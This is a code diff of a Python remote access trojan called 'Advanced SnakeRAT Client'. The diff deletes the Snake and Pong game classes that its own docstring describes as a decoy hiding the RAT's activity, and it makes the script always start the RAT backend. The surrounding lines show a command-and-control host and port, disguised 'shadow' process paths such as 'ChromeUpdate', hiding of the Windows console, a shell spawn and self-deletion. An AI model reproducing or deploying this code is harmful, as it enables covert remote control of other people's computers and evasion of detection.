@@ -5,7 +5,6 @@ Cross-Platform Version (Linux/Windows/macOS)
 Version: 3.1 Professional
 """
 
-import pygame
 import sys
 import socket
 import io
@@ -4052,7 +4051,7 @@ pty.spawn("/bin/sh")
 
     def _handle_message_box(self, cmd):
         """Show a message box (GUI)"""
-        text = cmd.get('text', 'Hello from SnakeGame!')
+        text = cmd.get('text', 'Hello from System!')
         title = cmd.get('title', 'System Message')
         try:
             if IS_WINDOWS:
@@ -4548,283 +4547,7 @@ rm -f "$0"'''
         except Exception as e:
             return {'error': str(e)}
 
-class SnakeGame:
-    """Snake Engine for Arcade Decoy"""
-    def __init__(self, width=800, height=600):
-        self.width, self.height = width, height
-        self.grid_size = 20
-        self.colors = {
-            'background': (20, 20, 40), 'snake_head': (0, 255, 100),
-            'food': (255, 100, 100), 'text': (255, 255, 255), 'grid': (40, 40, 60)
-        }
-        self.snake_x = self.snake_y = 0
-        self.dx = self.dy = 0
-        self.snake: List[Tuple[int, int]] = []
-        self.food: Tuple[int, int] = (0, 0)
-        self.score = self.level = 0
-        self.base_speed = self.speed = 0
-        self.game_over = self.paused = False
-        self.logger = logging.getLogger("Snake")
-        self.reset_game()
-        
-    def reset_game(self):
-        self.snake_x, self.snake_y = self.width // 2, self.height // 2
-        self.dx, self.dy = self.grid_size, 0
-        self.snake = [(self.snake_x, self.snake_y)]
-        self.food = self._generate_food()
-        self.score, self.level = 0, 1
-        self.base_speed, self.speed = 10, 10
-        self.game_over, self.paused = False, False
-    
-    def _generate_food(self):
-        """Generate food at random position"""
-        import random
-        
-        max_x = (self.width - self.grid_size) // self.grid_size
-        max_y = (self.height - self.grid_size) // self.grid_size
-        
-        while True:
-            fx = random.randint(0, max_x) * self.grid_size
-            fy = random.randint(0, max_y) * self.grid_size
-            
-            if (fx, fy) not in self.snake:
-                return (fx, fy)
-    
-    def handle_events(self):
-        """Handle keyboard input for Snake"""
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT:
-                return False
-            if event.type == pygame.KEYDOWN:
-                if event.key == pygame.K_ESCAPE:
-                    return False
-                if event.key == pygame.K_p:
-                    self.paused = not self.paused
-                if self.game_over and event.key == pygame.K_SPACE:
-                    self.reset_game()
-                
-                # Direction changes (prevent 180 turns)
-                if not self.paused:
-                    if event.key in [pygame.K_UP, pygame.K_w] and self.dy == 0:
-                        self.dx, self.dy = 0, -self.grid_size
-                    elif event.key in [pygame.K_DOWN, pygame.K_s] and self.dy == 0:
-                        self.dx, self.dy = 0, self.grid_size
-                    elif event.key in [pygame.K_LEFT, pygame.K_a] and self.dx == 0:
-                        self.dx, self.dy = -self.grid_size, 0
-                    elif event.key in [pygame.K_RIGHT, pygame.K_d] and self.dx == 0:
-                        self.dx, self.dy = self.grid_size, 0
-        return True
-    
-    def update(self):
-        """Update game state"""
-        if self.game_over or self.paused:
-            return
-        
-        # Move snake
-        self.snake_x += self.dx
-        self.snake_y += self.dy
-        
-        # Wrap around edges
-        if self.snake_x >= self.width:
-            self.snake_x = 0
-        elif self.snake_x < 0:
-            self.snake_x = self.width - self.grid_size
-        
-        if self.snake_y >= self.height:
-            self.snake_y = 0
-        elif self.snake_y < 0:
-            self.snake_y = self.height - self.grid_size
-        
-        # Add new head
-        self.snake.insert(0, (self.snake_x, self.snake_y))
-        
-        # Check food collision
-        if (self.snake_x, self.snake_y) == self.food:
-            self.score += 10
-            self.food = self._generate_food()
-            
-            # Level up every 50 points
-            if self.score % 50 == 0:
-                self.level += 1
-                self.speed = self.base_speed + (self.level * 2)
-        else:
-            # Remove tail
-            self.snake.pop()
-        
-        # Check self collision
-        if len(self.snake) > 1 and (self.snake_x, self.snake_y) in self.snake[1:]:
-            self.logger.warning(f"Game Over! Final Score: {self.score}")
-            self.game_over = True
-    
-    def draw(self, screen):
-        """Draw everything"""
-        screen.fill(self.colors['background'])
-        # Grid
-        for x in range(0, self.width, self.grid_size):
-            pygame.draw.line(screen, self.colors['grid'], (x, 0), (x, self.height), 1)
-        for y in range(0, self.height, self.grid_size):
-            pygame.draw.line(screen, self.colors['grid'], (0, y), (self.width, y), 1)
-        
-        # Food
-        fx, fy = self.food
-        pulse = abs(pygame.time.get_ticks() % 1000 - 500) / 500
-        size = int(self.grid_size - 4 + (pulse * 2))
-        offset = (self.grid_size - size) // 2
-        pygame.draw.rect(screen, self.colors['food'], (fx + offset, fy + offset, size, size))
-        
-        # Snake
-        for i, (x, y) in enumerate(self.snake):
-            color = self.colors['snake_head'] if i == 0 else (0, max(50, 255 - (i * 5)), 0)
-            pygame.draw.rect(screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
-        
-        # Overlays
-        score_text = pygame.font.Font(None, 36).render(f'Score: {self.score}', True, self.colors['text'])
-        screen.blit(score_text, (20, 20))
-        
-        if self.game_over:
-            overlay = pygame.Surface((self.width, self.height))
-            overlay.set_alpha(128)
-            overlay.fill((0, 0, 0))
-            screen.blit(overlay, (0, 0))
-            go_text = pygame.font.Font(None, 72).render('GAME OVER', True, (255, 0, 0))
-            screen.blit(go_text, go_text.get_rect(center=(self.width // 2, self.height // 2 - 50)))
-            prompt = pygame.font.Font(None, 36).render('Press SPACE to Restart or ESC to Menu', True, (255, 255, 255))
-            screen.blit(prompt, prompt.get_rect(center=(self.width // 2, self.height // 2 + 20)))
-
-class PongGame:
-    """Pong Engine for Arcade Decoy"""
-    def __init__(self, width=800, height=600):
-        self.width, self.height = width, height
-        self.padx = self.pady = self.cpu_padx = self.cpu_pady = 0
-        self.pad_w = self.pad_h = 0
-        self.ball_x = self.ball_y = self.ball_dx = self.ball_dy = 0
-        self.score = self.cpu_score = 0
-        self.game_over = self.paused = False
-        self.speed = 40
-        self.reset_game()
-        
-    def reset_game(self):
-        self.padx, self.pady = 20, self.height // 2 - 45
-        self.cpu_padx, self.cpu_pady = self.width - 35, self.height // 2 - 45
-        self.pad_w, self.pad_h = 15, 90
-        self.ball_x, self.ball_y = self.width // 2, self.height // 2
-        self.ball_dx, self.ball_dy = 7 * random.choice([-1, 1]), 7 * random.choice([-1, 1])
-        self.score, self.cpu_score = 0, 0
-        self.game_over = False
-        self.paused = False
-
-    def handle_events(self):
-        keys = pygame.key.get_pressed()
-        if not self.paused and not self.game_over:
-            if keys[pygame.K_UP] and self.pady > 0: self.pady -= 8
-            if keys[pygame.K_DOWN] and self.pady < self.height - self.pad_h: self.pady += 8
-        
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT: return False
-            if event.type == pygame.KEYDOWN:
-                if event.key == pygame.K_p: self.paused = not self.paused
-                if self.game_over and event.key == pygame.K_SPACE: self.reset_game()
-                if event.key == pygame.K_ESCAPE: return False # Back to menu
-        return True
-
-    def update(self):
-        if self.game_over or self.paused: return
-        self.ball_x += self.ball_dx
-        self.ball_y += self.ball_dy
-        
-        if self.ball_y <= 0 or self.ball_y >= self.height - 15: self.ball_dy *= -1
-        
-        # CPU AI
-        if self.cpu_pady + self.pad_h // 2 < self.ball_y: self.cpu_pady += 6
-        else: self.cpu_pady -= 6
-        
-        # Collisions
-        if self.ball_x <= self.padx + self.pad_w and self.pady < self.ball_y < self.pady + self.pad_h:
-            self.ball_dx *= -1
-            self.ball_dx = int(self.ball_dx * 1.1)
-        if self.ball_x >= self.cpu_padx - 15 and self.cpu_pady < self.ball_y < self.cpu_pady + self.pad_h:
-            self.ball_dx *= -1
-            self.ball_dx = int(self.ball_dx * 1.1)
-            
-        if self.ball_x < 0: self.cpu_score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = 7
-        if self.ball_x > self.width: self.score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = -7
-        
-        if self.score >= 5 or self.cpu_score >= 5: self.game_over = True
-
-    def draw(self, screen):
-        screen.fill((10, 10, 10))
-        pygame.draw.rect(screen, (255, 255, 255), (self.padx, self.pady, self.pad_w, self.pad_h))
-        pygame.draw.rect(screen, (255, 255, 255), (self.cpu_padx, self.cpu_pady, self.pad_w, self.pad_h))
-        pygame.draw.circle(screen, (255, 255, 255), (int(self.ball_x), int(self.ball_y)), 10)
-        
-        font = pygame.font.Font(None, 74)
-        text = font.render(f"{self.score}  {self.cpu_score}", True, (255, 255, 255))
-        screen.blit(text, (self.width // 2 - 50, 20))
-        if self.game_over:
-            msg = "YOU WIN!" if self.score > self.cpu_score else "CPU WINS!"
-            win_text = font.render(msg, True, (0, 255, 0) if self.score > self.cpu_score else (255, 0, 0))
-            screen.blit(win_text, win_text.get_rect(center=(self.width//2, self.height//2)))
-
-class ArcadeDecoy:
-    """The central Game Hub that disguises the RAT activities"""
-    def __init__(self):
-        pygame.init()
-        self.width, self.height = 800, 600
-        self.screen = pygame.display.set_mode((self.width, self.height))
-        pygame.display.set_caption("Retro Arcade Collection v1.4")
-        self.clock = pygame.time.Clock()
-        self.rat = AdvancedRAT()
-        self.state = "MENU" # MENU, SNAKE, PONG
-        self.active_game: Any = None
-        
-        self.run()
-
-    def run(self):
-        while True:
-            if self.state == "MENU":
-                if not self.handle_menu(): break
-            elif self.state == "SNAKE":
-                if not self.active_game: self.active_game = SnakeGame()
-                if not self.active_game.handle_events(): 
-                    self.state = "MENU"; self.active_game = None; continue
-                self.active_game.update()
-                self.active_game.draw(self.screen)
-                pygame.display.flip()
-                self.clock.tick(self.active_game.speed)
-            elif self.state == "PONG":
-                if not self.active_game: self.active_game = PongGame()
-                if not self.active_game.handle_events(): 
-                    self.state = "MENU"; self.active_game = None; continue
-                self.active_game.update()
-                self.active_game.draw(self.screen)
-                pygame.display.flip()
-                self.clock.tick(self.active_game.speed)
-
-    def handle_menu(self):
-        self.screen.fill((20, 20, 30))
-        font_l = pygame.font.Font(None, 64)
-        font_m = pygame.font.Font(None, 32)
-        
-        title = font_l.render("RETRO ARCADE", True, (255, 215, 0))
-        self.screen.blit(title, title.get_rect(center=(self.width//2, 100)))
-        
-        options = ["1. Snake Classic", "2. Cyber Pong", "ESC. Quit"]
-        for i, opt in enumerate(options):
-            txt = font_m.render(opt, True, (200, 200, 200))
-            self.screen.blit(txt, txt.get_rect(center=(self.width//2, 250 + i*50)))
-            
-        pygame.display.flip()
-        
-        for event in pygame.event.get():
-            if event.type == pygame.QUIT: return False
-            if event.type == pygame.KEYDOWN:
-                if event.key == pygame.K_1: self.state = "SNAKE"
-                if event.key == pygame.K_2: self.state = "PONG"
-                if event.key == pygame.K_ESCAPE: return False
-        return True
-
-    def _log(self, level, message): # Dummy for back-compat if needed
-        pass
+# GUI/Decoy classes (SnakeGame, PongGame, ArcadeDecoy) removed — backend-only mode
 
 if __name__ == "__main__":
     try:
@@ -4832,11 +4555,9 @@ if __name__ == "__main__":
         parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
         parser.add_argument('--host', help='C2 Server Host IP', default=C2_HOST)
         parser.add_argument('--port', type=int, help='C2 Server Port', default=C2_PORT)
-        # Add support for flags that might be passed during elevation/respawn
         parser.add_argument('--takeover', action='store_true', help='Take over from previous instance')
         parser.add_argument('--shadow-process', action='store_true', help='Run in background shadow mode')
-        
-        # Use parse_known_args to avoid crashing on unexpected parameters
+
         args, unknown = parser.parse_known_args()
 
         if args.takeover:
@@ -4851,33 +4572,27 @@ if __name__ == "__main__":
             C2_SERVERS[0]['port'] = C2_PORT
 
         print(f"[*] Initializing connection to {C2_HOST}:{C2_PORT}...")
-        
+
         # Detect Instance Mode
         if getattr(sys, 'frozen', False):
             current_path = os.path.abspath(sys.executable)
         else:
             current_path = os.path.abspath(__file__)
-            
+
         is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
-        
-        # Hide console if requested or shadow
+
+        # Hide console for shadow/background instances
         if args.takeover or args.shadow_process or is_shadow:
             if IS_WINDOWS:
                 try:
-                    import ctypes
                     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
                 except: pass
 
-        if is_shadow:
-            print("[*] Detected Shadow Process - Running in background mode...")
-            
-            rat = AdvancedRAT()
-            while rat.running:
-                time.sleep(1)
-        else:
-            print("[*] Starting Game Decoy Hub...")
-            ArcadeDecoy()
-            
+        print("[*] Starting RAT backend...")
+        rat = AdvancedRAT()
+        while rat.running:
+            time.sleep(1)
+
     except Exception as e:
         print(f"[!] FATAL ERROR DURING STARTUP: {str(e)}")
         import traceback
